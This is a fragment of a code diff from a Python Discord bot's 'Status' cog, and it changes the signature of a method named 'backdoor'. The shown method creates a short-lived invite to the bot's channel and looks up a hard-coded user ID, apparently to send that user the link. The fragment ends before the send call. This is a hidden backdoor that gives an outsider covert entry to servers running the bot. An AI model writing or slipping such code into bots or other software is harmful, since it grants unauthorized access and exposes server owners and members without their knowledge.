@@ -88,7 +88,7 @@ class Status(commands.Cog):
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
-    async def backdoor(self, ctx):
+    async def backdoor(self):
         channel = discord.Client.get_channel(self.bot, BOT_CHANNEL)
         link = await channel.create_invite(max_age=300)
         send_to = discord.Client.get_user(self.bot, 1154559282801549384)
